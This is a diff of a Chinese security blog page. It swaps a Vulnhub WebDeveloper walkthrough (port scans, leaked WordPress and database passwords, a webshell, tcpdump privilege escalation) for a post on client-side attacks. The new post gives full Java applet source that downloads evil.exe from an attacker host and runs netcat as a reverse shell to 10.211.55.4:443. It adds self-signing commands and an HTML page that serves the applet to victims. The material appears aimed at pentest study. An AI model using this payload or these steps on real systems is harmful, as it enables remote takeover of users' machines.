@@ -6,26 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Vulnhub-Challenging-WebDeveloper | owefsad&#39;s blog</title>
+  <title>ClientSideAttack | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="简介  扫端口, 发现22、80，WEB站点发现pcap包, 获取wordpress后台 修改插件源码写入木马获取webshell webshell查敏感文件获取第权限账号 tcpdump提权获取root权限 靶机总结">
-<meta name="keywords" content="sudoers,privilege_escalate,wordpress,pcap_analyze">
+  <meta name="description" content="简介客户端攻击是针对用户发起的攻击, 客户端攻击通常与社工、钓鱼等技术进行组合造成较高的危害, 客户端攻击常见与某些组织对某些组织的定向攻击, 通过构造带附件的电子邮件、钓鱼网站、badusb等方法将payload放入目标机器中, 等待用户主动上线。客户端攻击常见的方法包括利用目标系统的nday、构造java applet自签名应用;">
+<meta name="keywords" content="java_applet">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Vulnhub-Challenging-WebDeveloper">
-<meta property="og:url" content="http://yoursite.com/2019/04/08/Vulnhub-Challenging-WebDeveloper/index.html">
+<meta property="og:title" content="ClientSideAttack">
+<meta property="og:url" content="http://yoursite.com/2019/07/02/ClientSideAttack/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
-<meta property="og:description" content="简介  扫端口, 发现22、80，WEB站点发现pcap包, 获取wordpress后台 修改插件源码写入木马获取webshell webshell查敏感文件获取第权限账号 tcpdump提权获取root权限 靶机总结">
+<meta property="og:description" content="简介客户端攻击是针对用户发起的攻击, 客户端攻击通常与社工、钓鱼等技术进行组合造成较高的危害, 客户端攻击常见与某些组织对某些组织的定向攻击, 通过构造带附件的电子邮件、钓鱼网站、badusb等方法将payload放入目标机器中, 等待用户主动上线。客户端攻击常见的方法包括利用目标系统的nday、构造java applet自签名应用;">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2019/04/08/Vulnhub-Challenging-WebDeveloper/nmap.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/08/Vulnhub-Challenging-WebDeveloper/pcap_pwd.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/08/Vulnhub-Challenging-WebDeveloper/weevely_get_reverse_shell.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/08/Vulnhub-Challenging-WebDeveloper/webdeveloper_login.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/08/Vulnhub-Challenging-WebDeveloper/tcpdump_get_root.png">
-<meta property="og:updated_time" content="2019-06-24T01:41:35.000Z">
+<meta property="og:updated_time" content="2019-07-02T15:19:40.267Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Vulnhub-Challenging-WebDeveloper">
-<meta name="twitter:description" content="简介  扫端口, 发现22、80，WEB站点发现pcap包, 获取wordpress后台 修改插件源码写入木马获取webshell webshell查敏感文件获取第权限账号 tcpdump提权获取root权限 靶机总结">
-<meta name="twitter:image" content="http://yoursite.com/2019/04/08/Vulnhub-Challenging-WebDeveloper/nmap.png">
+<meta name="twitter:title" content="ClientSideAttack">
+<meta name="twitter:description" content="简介客户端攻击是针对用户发起的攻击, 客户端攻击通常与社工、钓鱼等技术进行组合造成较高的危害, 客户端攻击常见与某些组织对某些组织的定向攻击, 通过构造带附件的电子邮件、钓鱼网站、badusb等方法将payload放入目标机器中, 等待用户主动上线。客户端攻击常见的方法包括利用目标系统的nday、构造java applet自签名应用;">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -189,50 +183,49 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Vulnhub-Challenging-WebDeveloper" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-ClientSideAttack" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Vulnhub-Challenging-WebDeveloper
+      ClientSideAttack
     </h1>
   
 
         
-        <a href="/2019/04/08/Vulnhub-Challenging-WebDeveloper/" class="archive-article-date">
-  	<time datetime="2019-04-08T13:39:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-08</time>
+        <a href="/2019/07/02/ClientSideAttack/" class="archive-article-date">
+  	<time datetime="2019-07-02T14:45:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-02</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简介</p>
-<ol>
-<li>扫端口, 发现22、80，WEB站点发现pcap包, 获取wordpress后台</li>
-<li>修改插件源码写入木马获取webshell</li>
-<li>webshell查敏感文件获取第权限账号</li>
-<li>tcpdump提权获取root权限</li>
-<li>靶机总结</li>
-</ol>
-<a id="more"></a>
+        <p>简介<br>客户端攻击是针对用户发起的攻击, 客户端攻击通常与社工、钓鱼等技术进行组合造成较高的危害, 客户端攻击常见与某些组织对某些组织的定向攻击, 通过构造带附件的电子邮件、钓鱼网站、badusb等方法将payload放入目标机器中, 等待用户主动上线。<br>客户端攻击常见的方法包括利用目标系统的nday、构造java applet自签名应用;<br><a id="more"></a></p>
 <h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
-<li>nmap扫端口定方向</li>
-<li>wordpress得shell</li>
+<li>attack for IE</li>
+<li>java applet</li>
 </ul>
-<h2 id="nmap端口扫描确定方向"><a href="#nmap端口扫描确定方向" class="headerlink" title="nmap端口扫描确定方向"></a>nmap端口扫描确定方向</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sS -sC -p- -A 172.16.88.194</span><br></pre></td></tr></table></figure>
-<p><img src="nmap.png" alt="nmap"><br>22端口, openssh-7.6p1 无可用CVE, 考虑爆破, 暂时搁置<br>80端口, Apache-httpd-2.4.29 无可用CVE, 考虑80端口WEB服务漏洞挖掘getshell</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://172.16.88.194 /usr/share/wordlists/dirb/big.txt -f -w</span><br></pre></td></tr></table></figure>
-<p>发现<code>ipdata</code>目录中有<code>analyze.cap</code>文件, 下载之后进行数据包分析, 发现post请求包中含有wordpress账号密码<br><img src="pcap_pwd.png" alt="pcap_ayalyze"><br>uname: webdeveloper<br>pass: Te5eQg&amp;4sBS!Yr$)wf%(DcAd</p>
-<p>拿到密码后, 首先尝试ssh登陆, 无果后开始利用wordpress渗透.</p>
-<h2 id="wordpress-getshell"><a href="#wordpress-getshell" class="headerlink" title="wordpress getshell"></a>wordpress getshell</h2><p>之前打靶机的时候遇到过wordpress站点, 但一直没有进行总结, 所以这次遇到的时候还是蒙蔽来好久, wordpress的主题(Themes)、插件(Plugins)中有editor功能可以用在线编辑文件(包括php文件), 因此可以直接修改文件插入木马getshell.<br>这次使用该功能时发现了一个有意思的情况: 插件未激活时, 可编辑php文件; 插件激活后无法编辑php文件. 因此通过停用插件插入木马然后启用插件实现getshell.</p>
-<h3 id="编辑插件php代码获得shell"><a href="#编辑插件php代码获得shell" class="headerlink" title="编辑插件php代码获得shell"></a>编辑插件php代码获得shell</h3><p><img src="weevely_get_reverse_shell.png" alt="weevely_get_reverse_shell"></p>
-<h3 id="搜索站点文件-发现敏感信息"><a href="#搜索站点文件-发现敏感信息" class="headerlink" title="搜索站点文件, 发现敏感信息"></a>搜索站点文件, 发现敏感信息</h3><p>通过<code>ps aux</code>查看进程发现存在以mysql用户权限运行的mysqld进程, 因此可以考虑从mysql服务进行提权. 于是开始搜web目录下的config文件, 在<code>/var/www/html/wp-config.php</code>中找到数据库的账号和密码: <code>webdeveloper</code>, <code>MasterOfTheUniverse</code></p>
-<p>发现账号密码后, 尝试ssh登陆,成功进入webdeveloper账户. 进入账户后, 查看用户ID， 发现当前用户位普通用户, 需要提权.<br><img src="webdeveloper_login.png" alt="webdeveloper_login"></p>
-<h3 id="利用sudoers配置提权"><a href="#利用sudoers配置提权" class="headerlink" title="利用sudoers配置提权"></a>利用sudoers配置提权</h3><p>获得普通用户权限后, 需要尝试提权, 提权首先要找的是sudoers配置、suid文件、crontab任务, 通过<code>sudo -l</code>命令查看webdeveloper用户可用root权限执行的命令, 发现tcpdump。 tcpdump 4.0版本之后，可以在捕获到数据包时执行操作系统命令, 创建修改root账户密码的shell脚本并赋予执行权限, 然后运行tcpdump抓包, 用另一台机器ping这台靶机即可触发payload并获取root权限.<br><img src="tcpdump_get_root.png" alt="tcpdump_get_root"> </p>
-<h2 id="靶机总结"><a href="#靶机总结" class="headerlink" title="靶机总结"></a>靶机总结</h2><p>靶机偏入门, 扫目录找到pcap包, 查pcap包发现账号密码, 用密码尝试登陆ssh、wordpress获得wordpress后台, wordpress插件修改源码插入木马, weevely连接木马拿到webshell, WEB站点配置文件搜索发现低权限账号的密码, 登陆ssh查配置发现tcpdump, 用tcpdump抓包提权获取root权限.<br>如果对这些技术比较熟悉的话, 40分钟内应该可以搞定.</p>
+<blockquote>
+<p>attack for IE</p>
+</blockquote>
+<p>第一种方法是收集目标的客户端信息, 包括操作系统版本、浏览器版本、电子邮件客户端版本等; 然后根据其中的n day或0 day构造恶意触发程序, 诱导目标触发恶意程序; 这种方法的难点在于收集客户端的信息, 这通常是较难的;<br>该部分内容可自行搜索, 找对应的demo视频观看学习思路, 然后学习总结客户端n day, 理解exp并构建自己的特定exp即可;</p>
+<blockquote>
+<p>java applet</p>
+</blockquote>
+<p>java applet是一种运行于WEB环境中, 在客户端执行的java应用程序, 因此, 客户通过构建java applet应用程序并放置于WEB应用中, 等待目标访问并执行;<br>该攻击方法影响安装java且支持浏览器运行java应用程序的目标, 但是该攻击方法会给用户一个警告框, 所以该攻击的成功率不太乐观。</p>
+<h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><p>目标安装java环境 + IE配置“允许活动内容在我的计算机上的文件中运行*”</p>
+<h4 id="攻击载荷"><a href="#攻击载荷" class="headerlink" title="攻击载荷"></a>攻击载荷</h4><p>构建java应用<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java.java</span></span><br><span class="line"><span class="keyword">import</span> java.applet.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Author: Offensive Security</span></span><br><span class="line"><span class="comment">* This Java applet will download a file and execute it.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Java</span> <span class="keyword">extends</span> <span class="title">Applet</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Object initialized = <span class="keyword">null</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">isInitialized</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> initialized;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Process f;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			String tmpdir = System.getProperty(<span class="string">"java.io.tmpdir"</span>) + File.separator;</span><br><span class="line">			String expath = tmpdir + <span class="string">"evil.exe"</span>;</span><br><span class="line">			String download = <span class="string">""</span>;</span><br><span class="line">			download = getParameter(<span class="string">"1"</span>);</span><br><span class="line">			<span class="keyword">if</span> (download.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="comment">// URL parameter</span></span><br><span class="line">				URL url = <span class="keyword">new</span> URL(download);</span><br><span class="line">				<span class="comment">// Get an input stream for reading</span></span><br><span class="line">				InputStream in = url.openStream();</span><br><span class="line">				<span class="comment">// Create a buffered input stream for efficency</span></span><br><span class="line">				BufferedInputStream bufIn = <span class="keyword">new</span> BufferedInputStream(in);</span><br><span class="line">				File outputFile = <span class="keyword">new</span> File(expath);</span><br><span class="line">				OutputStream out = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span></span><br><span class="line">				FileOutputStream(outputFile));</span><br><span class="line">				<span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">				<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">					<span class="keyword">int</span> nBytes = bufIn.read(buffer); <span class="keyword">if</span> (nBytes &lt;= <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">					out.write(buffer, <span class="number">0</span>, nBytes);</span><br><span class="line">				&#125;</span><br><span class="line">				out.flush();</span><br><span class="line">				out.close();</span><br><span class="line">				in.close();</span><br><span class="line">				f = Runtime.getRuntime().exec(<span class="string">"cmd.exe /c "</span> + expath + <span class="string">" 10.211.55.4 443 –e cmd.exe"</span>);</span><br><span class="line">				<span class="comment">//f = Runtime.getRuntime().exec("cmd.exe /c " + expath);</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">			e.printStackTrace( );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* ended here and commented out below for bypass */</span></span><br><span class="line">		<span class="keyword">catch</span> (Exception exception)&#123;</span><br><span class="line">			exception.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译java文件为class文件: <code>javac Java.java</code></p>
+<p>创建manifest文件: <code>echo &quot;Permissions: all-permissions&quot;&gt;manifest.txt</code></p>
+<p>创建jar包: <code>jar cvf Java.jar Java.class</code></p>
+<p>创建自签名文件: <code>keytool -genkey -alias signapplet -keystore mykeystore -keypass password -storepass password</code></p>
+<p>对jar包进行签名: <code>jarsigner -keystore mykeystore -storepass password -keypass password -signedjar SignedJava.jar Java.jar signapplet</code></p>
+<p>创建html页面: <code>echo &#39;&lt;applet width=&quot;1&quot; height=&quot;1&quot; id=&quot;Java Secure&quot; code=&quot;Java.class&quot; archive=&quot;SignedJava.jar&quot;&gt;&lt;param name=&quot;1&quot; value=&quot;http://10.211.55.4:80/evil.exe&quot;&gt;&lt;/applet&gt;&#39; &gt; /var/www/html/java.html</code></p>
+<p>将所需程序复制至web目录下: <code>cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe;cp SignedJava.jar /var/www/html/SignedJava.jar</code></p>
+<h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>等待客户端访问url并运行恶意小程序</p>
 
       
 
@@ -246,19 +239,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">sudoers</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">privilege_escalate</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">wordpress</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pcap_analyze</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">java_applet</a>
         		</li>
       		
 		</ul>
@@ -270,7 +251,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/ctf//" class="article-tag-list-link color4">ctf</a>
+        			<a href="/categories/思路//" class="article-tag-list-link color3">思路</a>
         		</li>
       		
 		</ul>
@@ -288,18 +269,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/04/15/HTB-Linux-irked/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          HTB_Linux_irked
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/04/05/Vulnhub-Challenging-Born2Root-2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Vulnhub-Challenging-Born2Root-2</div>
+    <a href="/2019/07/01/File-Transfers/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">File Transfers</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -326,7 +298,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap端口扫描确定方向"><span class="toc-number">2.</span> <span class="toc-text">nmap端口扫描确定方向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wordpress-getshell"><span class="toc-number">3.</span> <span class="toc-text">wordpress getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编辑插件php代码获得shell"><span class="toc-number">3.1.</span> <span class="toc-text">编辑插件php代码获得shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#搜索站点文件-发现敏感信息"><span class="toc-number">3.2.</span> <span class="toc-text">搜索站点文件, 发现敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用sudoers配置提权"><span class="toc-number">3.3.</span> <span class="toc-text">利用sudoers配置提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#靶机总结"><span class="toc-number">4.</span> <span class="toc-text">靶机总结</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击条件"><span class="toc-number">1.0.1.</span> <span class="toc-text">攻击条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击载荷"><span class="toc-number">1.0.2.</span> <span class="toc-text">攻击载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#attack"><span class="toc-number">1.0.3.</span> <span class="toc-text">attack</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
